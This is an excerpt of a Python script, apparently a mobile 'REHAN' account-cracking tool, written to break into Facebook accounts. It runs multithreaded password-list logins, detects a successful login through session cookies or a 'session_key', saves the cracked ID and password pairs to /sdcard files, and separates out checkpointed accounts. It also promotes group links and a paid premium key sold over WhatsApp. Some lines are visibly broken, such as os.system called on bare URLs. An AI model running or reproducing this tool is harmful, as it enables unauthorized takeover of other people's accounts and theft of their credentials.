...
#os.system(f'xdg-open https://www.facebook.com/groups/1110694166194022/ ')
...
--------------------------------------------------
 ...
 Version   : 0.1
----------------------------------------------
 \33[37;41m\t Use Fresh File \33[0;m
\033[1;37m[!]  WIFI WORKING BRO AND USE OLD FILE WORKING:
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        os.system("https://facebook.com/groups/616555880415550/")
        print(logo)
loop=0
oks=[]
cps=[]
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://chat.whatsapp.com/CCx5u5coOHDAyOKpk9BxD8');menu()
                        elif xd in ['7','07']:
                                os.system('https://chat.whatsapp.com/CCx5u5coOHDAyOKpk9BxD8');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://chat.whatsapp.com/CCx5u5coOHDAyOKpk9BxD8');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+923104705723&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi REHAN Madam, I Need To Buy Your Paid REHAN PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python REHAN.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                with tred(max_workers=30) as REHAN:     
                        ...
                        for psx in user:
                                ...
                                REHAN.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [REHAN-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        REHAN=session.cookies.get_dict().keys()
                        if "c_user" in REHAN:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [REHAN-OK] %s | %s'%(ids,pas))
                                open('/sdcard/REHAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in REHAN:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [REHAN-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/REHAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [REHAN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/REHAN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/REHAN-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [REHAN-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/REHAN-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [REHAN-OK] '+uid+' | '+pas+'\033[1;97m')
